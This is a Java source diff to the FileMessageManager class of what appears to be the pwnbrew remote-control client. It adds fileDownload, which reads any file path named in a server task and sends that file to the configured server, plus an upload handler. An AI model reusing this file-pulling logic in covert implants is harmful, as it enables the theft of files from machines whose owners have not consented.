@@ -52,18 +52,21 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.logging.Level;
 import pwnbrew.ClientConfig;
 import pwnbrew.concurrent.LockListener;
 import pwnbrew.log.LoggableException;
+import pwnbrew.log.RemoteLog;
 import pwnbrew.manager.PortManager;
 import pwnbrew.manager.DataManager;
 import pwnbrew.utilities.FileUtilities;
 import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.PortRouter;
-import pwnbrew.network.control.ControlMessageManager;
 import pwnbrew.network.control.messages.PushFile;
 import pwnbrew.network.control.messages.PushFileAck;
+import pwnbrew.network.control.messages.TaskGetFile;
 import pwnbrew.selector.SocketChannelHandler;
+import pwnbrew.utilities.DebugPrinter;
 
 /**
  *
@@ -77,6 +80,7 @@ public class FileMessageManager extends DataManager implements LockListener {
     
     private static final String NAME_Class = FileMessageManager.class.getSimpleName();    
     private int lockVal = 0;
+    private int retChannelId = 0;
   
     //===========================================================================
     /*
@@ -141,19 +145,7 @@ public class FileMessageManager extends DataManager implements LockListener {
         return (FileHandler)theDataHandler;
     }  
     
-    
-//    
-//    //===============================================================
-//    /**
-//    * Sets up for a file transfer
-//    *
-//    * @param fileToTransfer
-//    * @return
-//    */
-//    private void initFileTransfer( int passedSrcHostId, int passedTaskId, int passedFileId, File parentDir, String hashFilenameStr, long passedFileSize) 
-//            throws LoggableException, NoSuchAlgorithmException, IOException {
-        
-     //===============================================================
+    //===============================================================
     /**
     * Sets up for a file transfer
     *
@@ -165,13 +157,11 @@ public class FileMessageManager extends DataManager implements LockListener {
         //Get the socket router
         ClientConfig theConf = ClientConfig.getConfig();
         int socketPort = theConf.getSocketPort();
-//        String serverIp = theConf.getServerIp();
         ClientPortRouter aPR = (ClientPortRouter) thePortManager.getPortRouter( socketPort );
                        
         //Initiate the file transfer
         if(aPR != null){
-            
-//            aPR.ensureConnectivity( serverIp, socketPort, this );       
+                   
             int fileId = passedMsg.getFileId();
             //Initialize the file transfer
             synchronized( theFileReceiverMap ){
@@ -243,7 +233,6 @@ public class FileMessageManager extends DataManager implements LockListener {
         int fileType = passedMessage.getFileType();
         switch(fileType){
             case PushFile.JOB_SUPPORT:
-//                libDir = new File( Persistence.getDataPath(), Integer.toString(taskId) ); 
                 libDir = FileUtilities.getTempDir();
                 break;
             case PushFile.FILE_UPLOAD:
@@ -252,23 +241,17 @@ public class FileMessageManager extends DataManager implements LockListener {
         }
                 
         if( libDir != null ){
-            
-//            //Get the control manager for sending messages
-//            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
-//            if( aCMManager != null ){
-                
-                String hashFileNameStr = passedMessage.getHashFilenameString();
-                initFileTransfer( passedMessage, libDir );
-                
-                //DebugPrinter.printMessage(PortManager.class.getSimpleName(), "Sending ACK for " + hashFileNameStr);
-                PushFileAck aSFMA = new PushFileAck(fileChannelId, taskId, fileId, hashFileNameStr);
-                aSFMA.setDestHostId( passedMessage.getSrcHostId() );
-                
-                //Send the message
-                DataManager.send(thePortManager, aSFMA);
-//                aCMManager.send(aSFMA);
-                retVal = true;
-//            }
+                            
+            String hashFileNameStr = passedMessage.getHashFilenameString();
+            initFileTransfer( passedMessage, libDir );
+
+            //DebugPrinter.printMessage(PortManager.class.getSimpleName(), "Sending ACK for " + hashFileNameStr);
+            PushFileAck aSFMA = new PushFileAck(fileChannelId, taskId, fileId, hashFileNameStr);
+            aSFMA.setDestHostId( passedMessage.getSrcHostId() );
+
+            //Send the message
+            DataManager.send(thePortManager, aSFMA);
+            retVal = true;
 
         }
 
@@ -415,6 +398,79 @@ public class FileMessageManager extends DataManager implements LockListener {
         lockVal = 0;
         
         return retVal;
+    }
+
+    //========================================================================
+    /**
+     * 
+     * @param downloadFileMsg 
+     */
+    public void fileDownload(TaskGetFile downloadFileMsg) {
+        
+        //Get the filename hash 
+        String theHashFilenameStr = downloadFileMsg.getHashFilenameString();
+        String[] theFilePathArr = theHashFilenameStr.split(":", 2);
+        if( theFilePathArr.length > 1 ){
+
+            String theFilePath = theFilePathArr[1];            
+            File fileToSend = new File(theFilePath);
+            if(fileToSend.exists()){
+        
+                ClientConfig theConf = ClientConfig.getConfig();
+                int socketPort = theConf.getSocketPort();
+                String serverIp = theConf.getServerIp();
+
+                PortManager aPM = getPortManager();
+                ClientPortRouter aPR = (ClientPortRouter) aPM.getPortRouter( socketPort );
+                retChannelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
+                if(retChannelId != 0 ){
+                    //Queue the file to be sent
+                    String fileHashNameStr = new StringBuilder().append("0").append(":").append(theFilePath).toString();
+
+                    PushFile thePFM = new PushFile( downloadFileMsg.getTaskId(), retChannelId, fileHashNameStr, fileToSend.length(), PushFile.FILE_DOWNLOAD );
+                    thePFM.setDestHostId( downloadFileMsg.getSrcHostId() );
+                    DataManager.send(aPM, thePFM);
+                }
+            }
+        }
+    }
+
+    //========================================================================
+    /**
+     * 
+     * @param pushFileMsg 
+     */
+    public void fileUpload( PushFile pushFileMsg ) {
+        
+        ClientConfig theConf = ClientConfig.getConfig();
+        int socketPort = theConf.getSocketPort();
+        String serverIp = theConf.getServerIp();
+
+        //Get the port router
+        PortManager aPM = getPortManager();
+        ClientPortRouter aPR = (ClientPortRouter) aPM.getPortRouter( socketPort );
+        DebugPrinter.printMessage(  this.getClass().getSimpleName(), "Received push file.");
+
+        retChannelId = aPR.ensureConnectivity( serverIp, socketPort, this );   
+        if(retChannelId != 0 ){
+            try {
+                pushFileMsg.setFileChannelId(retChannelId);
+                prepFilePush( pushFileMsg );
+            } catch ( LoggableException | IOException ex) {
+                RemoteLog.log(Level.INFO, NAME_Class, "evaluate()", ex.getMessage(), ex );
+            }  
+        }
+    }
+
+    //=================================================================
+    /**
+     * 
+     * @param fileId 
+     */
+    public void removeFileSender(int fileId) {
+        synchronized( theFileSenderMap ){
+            theFileSenderMap.remove(fileId );
+        }
     }
     
 }
